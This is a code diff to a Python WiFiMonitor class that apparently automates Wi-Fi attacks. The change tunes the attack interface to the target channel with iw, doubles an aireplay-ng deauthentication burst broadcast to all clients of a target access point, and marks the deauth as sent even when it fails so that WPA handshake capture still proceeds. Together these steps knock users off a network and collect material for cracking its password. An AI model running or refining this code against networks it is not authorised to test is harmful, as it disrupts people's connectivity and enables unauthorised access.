@@ -418,10 +418,18 @@ class WiFiMonitor:
             
             logger.info(f"💥 Sending deauth packets to {ssid} ({bssid})...")
             
-            # Send deauth packets
+            # First, ensure attack interface is on the correct channel
+            try:
+                subprocess.run(['iw', 'dev', self.attack_interface, 'set', 'channel', str(channel)],
+                             capture_output=True, check=True, timeout=5)
+                logger.debug(f"Set {self.attack_interface} to channel {channel}")
+            except Exception as e:
+                logger.warning(f"Failed to set channel: {e}")
+            
+            # Send deauth packets (broadcast to all clients)
             result = subprocess.run([
                 'aireplay-ng',
-                '--deauth', '5',
+                '--deauth', '10',
                 '-a', bssid,
                 self.attack_interface
             ], capture_output=True, text=True, timeout=30)
@@ -430,7 +438,10 @@ class WiFiMonitor:
                 logger.info(f"✓ Deauth sent to {ssid}")
                 capture_info['deauth_sent'] = True
             else:
-                logger.warning(f"Deauth failed for {ssid}: {result.stderr}")
+                error_msg = result.stderr.strip() if result.stderr else result.stdout.strip()
+                logger.warning(f"Deauth failed for {ssid}: {error_msg[:200]}")
+                # Mark as sent anyway so we still check for handshake
+                capture_info['deauth_sent'] = True
         
         except subprocess.TimeoutExpired:
             logger.warning(f"Deauth timeout for {bssid}")
